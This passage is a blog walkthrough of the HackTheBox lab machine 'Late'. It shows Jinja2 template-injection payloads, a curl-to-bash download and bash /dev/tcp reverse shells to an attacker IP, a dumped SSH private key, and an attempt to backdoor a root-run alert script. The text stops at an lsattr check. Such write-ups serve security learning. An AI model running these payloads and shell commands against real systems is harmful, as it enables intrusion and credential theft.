@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Late -- HTB walkthrough ::
+        Werz — CyberSecurity
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Official box page on HTB #  Writeup: #  System Scan | IP: 10.10.11.146 #  let&amp;rsquo;s add the ip to to the /etc/hosts file with the default hostnamelate.htb
+ echo &#39;10.10.11.156 late.htb &#39; &amp;gt;&amp;gt; /etc/hosts
+ Fireup a typical nmap scan | -sC for default set of scripts. | -sV for version detection | -T4 for traffic speed.
+ nmap -sC -sV -T4 10.10.11.156
+ nmap -sC -sV -T4 10."
+/>
+<meta
+  name="keywords"
+  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://0xwerz.github.io/23/04/2022/late/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Late -- HTB walkthrough"/>
+<meta name="twitter:description" content="https://app.hackthebox.com/machines/late"/>
+
+
+
+<meta property="og:title" content="Late -- HTB walkthrough" />
+<meta property="og:description" content="https://app.hackthebox.com/machines/late" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xwerz.github.io/23/04/2022/late/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-23T06:29:07+13:00" />
+<meta property="article:modified_time" content="2022-04-23T06:29:07+13:00" /><meta property="og:site_name" content="Werz" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="https://0xwerz.github.io/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >werz@blog:~$</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/archive">./archive</a></li>
+        
+      
+        
+          <li><a href="/posts">./articles</a></li>
+        
+      
+        
+          <li><a href="/about">./whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">./archive</a></li>
+      
+    
+      
+        <li><a href="/posts">./articles</a></li>
+      
+    
+      
+        <li><a href="/about">./whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Late &ndash; HTB walkthrough</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-04-23
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 6 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/linux/">#linux</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/easy/">#easy</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      Official <h3 id="official-box-pagehttpsapphacktheboxcommachineslate-on-htb">
+  <a href="https://app.hackthebox.com/machines/late" target="_blank">box page</a>
+ on HTB
+  <a href="#official-box-pagehttpsapphacktheboxcommachineslate-on-htb" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/Late.png" style="border-radius: 3%;" alt="">
+<h3 id="writeup">
+  Writeup:
+  <a href="#writeup" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="system-scan--ip-101011146">
+  System Scan | <strong>IP: 10.10.11.146</strong>
+  <a href="#system-scan--ip-101011146" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file with the default hostname<code>late.htb</code></p>
+<blockquote>
+<p><code>echo '10.10.11.156    late.htb ' &gt;&gt; /etc/hosts</code></p>
+</blockquote>
+<p>Fireup a typical nmap scan | <strong>-sC</strong> for default set of scripts. | <strong>-sV</strong> for version detection | <strong>-T4</strong> for traffic speed.</p>
+<blockquote>
+<p><code>nmap -sC -sV -T4 10.10.11.156</code></p>
+</blockquote>
+<pre tabindex="0"><code>nmap -sC -sV -T4 10.10.11.156            ✔  01:29:18 PM 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 13:29 CET
+Nmap scan report for late.htb (10.10.11.156)
+Host is up (0.55s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Late - Best online image tools
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds
+</code></pre><h4 id="open-ports">
+  Open Ports
+  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<table>
+<thead>
+<tr>
+<th>Ports</th>
+<th>Service</th>
+<th>Takeaways</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 7.6p1</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>nginx 1.14.0</td>
+</tr>
+</tbody>
+</table>
+<h4 id="enumeration--web-page">
+  Enumeration | Web page
+  <a href="#enumeration--web-page" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>we&rsquo;ll do some manual enumeration for the web page. you&rsquo;ll see a href link aims to <code>http://images.late.htb/</code>:</p>
+<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/images_href.png" style="border-radius: 3%;" alt="">
+add it to the hosts file also</p>
+<blockquote>
+<p><code>echo '10.10.11.156 images.late.htb ' &gt;&gt; /etc/hosts</code></p>
+</blockquote>
+<p>It appears to be a image to text converter It is also indicated that the Flask
+framework is used to do the conversions:</p>
+<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/images_page_header.png" style="border-radius: 3%;" alt="">
+I&rsquo;ll give it a try, so i&rsquo;ll screenshot a text for for example this image:</p>
+<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/Hello-world.png" style="border-radius: 3%;" alt="">
+we&rsquo;ll get as a response a txt file<code>results.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@ctf01 results<span style="color:#f92672">]</span>$ cat results.txt 
+&lt;p&gt;Hello world
+&lt;/p&gt;
+<span style="color:#f92672">[</span>werz@ctf01 results<span style="color:#f92672">]</span>$
+</code></pre></div><p>Since this is a flask application so it might be vulnerable to a Server Side Template Injection, let&rsquo;s figure it out.</p>
+<p>Flask use the template engine [Jinja2](<a href="https://jinja.palletsprojects.com/en/3.1.x/" target="_blank">Jinja — Jinja Documentation (3.1.x)</a>
+) by default, so that is what we&rsquo;ll be basing our payloads on.</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2" target="_blank">PayloadAllTheThings</a>
+ has a various payloads for this such type. I&rsquo;ll upload a typical payload like <code>{{ 7*7 }}</code> as a image to check it out:</p>
+<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/7*7.png" style="border-radius: 3%;" alt="">
+checking the <code>results.txt</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@ctf01 results<span style="color:#f92672">]</span>$ cat results_2.txt 
+&lt;p&gt;49
+&lt;/p&gt;<span style="color:#f92672">[</span>
+werz@Arch results<span style="color:#f92672">]</span>$
+</code></pre></div><p>So yeah! it seems work fine, we need to manage to get a reverse shell now <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2" target="_blank">PayloadAllTheThings</a>
+</p>
+<p>I&rsquo;ll use this type of payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{ cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</code></pre></div><p>Setup a bash reverse shell, I&rsquo;ll give it <code>index.html</code> name to get it mapped by the first endpoint <code>/</code> with the http python server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.8/9001 0&gt;&amp;1&#34;</span> &gt; rev
+<span style="color:#f92672">[</span>werz@ctf01 www<span style="color:#f92672">]</span>$ cat rev
+bash -i &gt;&amp; /dev/tcp/10.10.16.8/9001 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Then start a python server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch www<span style="color:#f92672">]</span>$ sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> werz: 
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{ cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;curl 10.10.16.8 | bash&#39;</span>)<span style="color:#f92672">.</span>read() }}
+
+</code></pre></div><p>the image should look like this, white background black font helps:</p>
+<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/late/img/rev_pay.png" style="border-radius: 3%;" alt="">
+and we have a shell!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@ctf01 www<span style="color:#f92672">]</span>$ nc -lvnp <span style="color:#ae81ff">9001</span>
+Connection from 10.10.11.156:35182
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1129<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+svc_acc@late:~/app$ 
+</code></pre></div><p>I&rsquo;ll grab the ssh keys to get a nice shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:~/app$ cat ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw<span style="color:#f92672">==</span>
+-----END RSA PRIVATE KEY-----
+svc_acc@late:~/app$ 
+</code></pre></div><p>copy it into a file and connect:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@ctf01 user<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;-----BEGIN RSA PRIVATE KEY-----
+</span><span style="color:#e6db74">MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+</span><span style="color:#e6db74">HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+</span><span style="color:#e6db74">bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+</span><span style="color:#e6db74">/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+</span><span style="color:#e6db74">d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+</span><span style="color:#e6db74">7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+</span><span style="color:#e6db74">fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+</span><span style="color:#e6db74">ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+</span><span style="color:#e6db74">W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+</span><span style="color:#e6db74">uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+</span><span style="color:#e6db74">T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+</span><span style="color:#e6db74">Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+</span><span style="color:#e6db74">WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+</span><span style="color:#e6db74">Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+</span><span style="color:#e6db74">t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+</span><span style="color:#e6db74">0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+</span><span style="color:#e6db74">uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+</span><span style="color:#e6db74">3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+</span><span style="color:#e6db74">GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+</span><span style="color:#e6db74">ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+</span><span style="color:#e6db74">Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+</span><span style="color:#e6db74">kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+</span><span style="color:#e6db74">Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+</span><span style="color:#e6db74">K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+</span><span style="color:#e6db74">kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
+</span><span style="color:#e6db74">-----END RSA PRIVATE KEY-----&#34;</span> &gt; id_rsa
+<span style="color:#f92672">[</span>werz@ctf01 user<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> id_rsa 
+<span style="color:#f92672">[</span>werz@ctf01 user<span style="color:#f92672">]</span>$ ssh -i id_rsa svc_acc@late.htb
+</code></pre></div><p>After connecting if we check the <code>/usr/local/sbin</code> directory we notice a file <code>ssh-alert.sh</code> ( linpeas says it also ) that looks interesting we own it also by <strong>svc_acc</strong> user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ cat ssh-alet.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+
+RECIPIENT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root@late.htb&#34;</span>
+SUBJECT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email from Server Login: SSH Alert&#34;</span>
+
+BODY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">A SSH login was detected.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        User:        </span>$PAM_USER<span style="color:#e6db74">
+</span><span style="color:#e6db74">        User IP Host: </span>$PAM_RHOST<span style="color:#e6db74">
+</span><span style="color:#e6db74">        Service:     </span>$PAM_SERVICE<span style="color:#e6db74">
+</span><span style="color:#e6db74">        TTY:         </span>$PAM_TTY<span style="color:#e6db74">
+</span><span style="color:#e6db74">        Date:        `date`
+</span><span style="color:#e6db74">        Server:      `uname -a`
+</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">${</span>PAM_TYPE<span style="color:#e6db74">}</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;open_session&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+        echo <span style="color:#e6db74">&#34;Subject:</span><span style="color:#e6db74">${</span>SUBJECT<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>BODY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | /usr/sbin/sendmail <span style="color:#e6db74">${</span>RECIPIENT<span style="color:#e6db74">}</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>The script looks to give out an alert to the root user whenever someone logs in with SSH,
+Let&rsquo;s upload <a href="https://github.com/DominicBreuker/pspy" target="_blank">Pspy</a>
+ to the monitor it in order to check how the script is run.
+we can simlpy upload it using scp .</p>
+<blockquote>
+<p>[werz@ctf01 user]$ scp -i id_rsa www/pspy32s <a href="mailto:svc_acc@late.htb">svc_acc@late.htb</a>
+:/tmp</p>
+</blockquote>
+<p>so yeah the script runs as root <strong>UID=0</strong> when a ssh connection made.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">2022/08/03 13:50:13 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>      | /sbin/init maybe-ubiquity 
+2022/08/03 13:50:43 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29921</span>  | /usr/sbin/sshd -D -R 
+2022/08/03 13:50:43 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">110</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29922</span>  | sshd: <span style="color:#f92672">[</span>net<span style="color:#f92672">]</span>          
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29923</span>  | /bin/bash /usr/local/sbin/ssh-alert.sh 
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29927</span>  | /usr/sbin/sendmail root@late.htb 
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span>???  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29926</span>  | ???
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29928</span>  | sendmail: MTA: 273DonSW029928 localhost.localdomain <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span>: DATA
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29930</span>  | sensible-mda svc_acc@new root  127.0.0.1 
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29929</span>  | sendmail: MTA: ./273DonSW029928 from queue     
+2022/08/03 13:50:49 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">29931</span>  | sshd: svc_acc        
+</code></pre></div><p>Since the script is being run as root we could potentially gain privileged access to the system by modifying it, with that we have the write permission to the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ ls -l ssh-alert.sh 
+-rwxr-xr-x <span style="color:#ae81ff">1</span> svc_acc svc_acc <span style="color:#ae81ff">433</span> Aug  <span style="color:#ae81ff">3</span> 07:50 ssh-alert.sh
+</code></pre></div><p>but if we attempt to modify to the file using vim or something it rejects:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">if [ </span><span style="color:#e6db74">${</span>PAM_TYPE<span style="color:#e6db74">}</span><span style="color:#e6db74"> = &#34;</span>open_session<span style="color:#e6db74">&#34; ]; then
+</span><span style="color:#e6db74">        echo &#34;</span>Subject:<span style="color:#e6db74">${</span>SUBJECT<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>BODY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; | /usr/sbin/sendmail </span><span style="color:#e6db74">${</span>RECIPIENT<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">fi
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/10.10.16.8/9002 0&gt;&amp;1
+</span><span style="color:#e6db74">&#34;</span>ssh-alert.sh<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">&#34;</span>ssh-alert.sh<span style="color:#e6db74">&#34; E212: Can&#39;t open file for writing
+</span><span style="color:#e6db74">Press ENTER or type command to continue
+</span></code></pre></div><p>In addition to file permissions, Unix systems use file attributes. These can be used to further lock down permissions. Let&rsquo;s list the attributes of this specific file with <code>lsattr</code> command</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh
+----ia--------e--- ssh-alert.sh
